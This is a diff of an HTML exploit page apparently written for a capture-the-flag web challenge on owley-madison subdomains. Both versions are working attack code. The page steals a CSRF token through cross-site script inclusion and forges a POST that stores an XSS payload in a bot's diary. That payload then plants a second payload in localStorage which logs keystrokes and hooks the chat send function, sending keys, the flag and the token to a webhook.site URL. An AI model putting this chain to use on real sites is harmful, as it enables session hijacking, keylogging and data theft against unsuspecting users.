@@ -1,72 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Owley Verification</title>
-</head>
+<head><title>Verify</title></head>
 <body>
-    <!-- 1. The Dummy Form: The XSSI script will inject the stolen token here -->
-    <form id="dummy_form"></form>
-
-    <!-- 2. The CSRF Form: Used to silently POST the payload to the bot's diary -->
-    <form id="csrf_form" action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST" target="hidden_frame">
-        <input type="hidden" name="content" id="csrf_content">
-        <!-- We will populate this token field using JavaScript -->
-        <input type="hidden" name="csrfmiddlewaretoken" id="csrf_token_field">
+    <form id="dummy"></form>
+    <form id="csrf_form" action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST" target="ifr">
+        <input type="hidden" name="content" id="c">
+        <input type="hidden" name="csrfmiddlewaretoken" id="t">
     </form>
-    
-    <!-- Hidden frame to prevent the form submission from navigating away immediately -->
-    <iframe name="hidden_frame" style="display:none;"></iframe>
+    <iframe name="ifr" style="display:none;"></iframe>
 
-    <!-- 3. Load the vulnerable script to steal the token -->
+    <!-- The XSSI Script -->
     <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
 
     <script>
-        // Wait for the CSRF script to load and execute
+        const WEBHOOK = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
+        
+        // --- STEP 1: Ping to see if bot reached GitHub ---
+        new Image().src = `${WEBHOOK}/?step=1_reached_github`;
+
         window.onload = function() {
-            // 4. Extract the bot's stolen token from our dummy form
-            var stolenToken = document.forms['dummy_form'].elements['csrfmiddlewaretoken'].value;
+            try {
+                const tokenInput = document.forms[0].querySelector('input[name="csrfmiddlewaretoken"]');
+                if (!tokenInput || !tokenInput.value) {
+                    new Image().src = `${WEBHOOK}/?step=ERROR_no_token_found`;
+                    return;
+                }
 
-            // 5. The XSS Payload (Wrapped in <script> tags for the diary)
-            var xssPayload = `<script>
-                document.domain = "owley-madison.jeopardy.websec.saarland";
-                var ifr = document.createElement('iframe');
-                ifr.src = "//match.owley-madison.jeopardy.websec.saarland/";
-                ifr.style.display = 'none';
-                document.body.appendChild(ifr);
+                const token = tokenInput.value;
+                new Image().src = `${WEBHOOK}/?step=2_token_stolen&token=${token}`;
 
-                ifr.onload = function() {
-                    var payload = "yassinmedhat</option><img src=x onerror=\\"" +
-                                  "document.domain='owley-madison.jeopardy.websec.saarland';" +
-                                  "parent.document.addEventListener('keyup', function(e) {" +
-                                  "  new Image().src='https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?key=' + encodeURIComponent(e.key);" +
-                                  "});" +
-                                  "var old_send = parent.send_message;" +
-                                  "parent.send_message = function() {" +
-                                  "  var full_flag = parent.document.getElementById('message').value;" +
-                                  "  new Image().src='https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2/?flag=' + encodeURIComponent(full_flag);" +
-                                  "  old_send();" + 
-                                  "};\\">";
-                    
-                    ifr.contentWindow.localStorage.setItem('favorites', JSON.stringify([payload]));
+                // --- STEP 2: The Payload ---
+                // We use a simpler payload first to verify execution
+                const xss = `<script>
+                    document.domain = "owley-madison.jeopardy.websec.saarland";
+                    var i = document.createElement('iframe');
+                    i.src = "//match.owley-madison.jeopardy.websec.saarland/";
+                    document.body.appendChild(i);
+                    i.onload = function() {
+                        var p = "yassinmedhat</option><img src=x onerror=\\"document.domain='owley-madison.jeopardy.websec.saarland';parent.document.addEventListener('keyup',e=>{new Image().src='${WEBHOOK}/?k='+e.key});var s=parent.send_message;parent.send_message=()=>{new Image().src='${WEBHOOK}/?f='+parent.document.getElementById('message').value;s()};\\">";
+                        i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));
+                        location.href = "//chat.owley-madison.jeopardy.websec.saarland/";
+                    };
+                <\/script>`;
 
-                    // Redirect to Chat to trigger the final payload
-                    setTimeout(function() {
-                        window.top.location.href = "//chat.owley-madison.jeopardy.websec.saarland/";
-                    }, 1000); 
-                };
-            <\/script>`;
+                document.getElementById('t').value = token;
+                document.getElementById('c').value = xss;
 
-            // 6. Arm the CSRF form with the payload and the stolen token
-            document.getElementById('csrf_content').value = xssPayload;
-            document.getElementById('csrf_token_field').value = stolenToken;
+                // --- STEP 3: Fire CSRF ---
+                document.getElementById('csrf_form').submit();
+                new Image().src = `${WEBHOOK}/?step=3_csrf_submitted`;
 
-            // 7. Fire the CSRF attack
-            document.getElementById('csrf_form').submit();
+                // --- STEP 4: Redirect to Trigger ---
+                setTimeout(() => {
+                    new Image().src = `${WEBHOOK}/?step=4_final_redirect`;
+                    window.location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
+                }, 1000);
 
-            // 8. Wait 1 second for the diary to save, then force the bot to view its infected diary
-            setTimeout(function() {
-                window.location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
-            }, 1000);
+            } catch (err) {
+                new Image().src = `${WEBHOOK}/?step=JS_ERROR&msg=${encodeURIComponent(err)}`;
+            }
         };
     </script>
 </body>
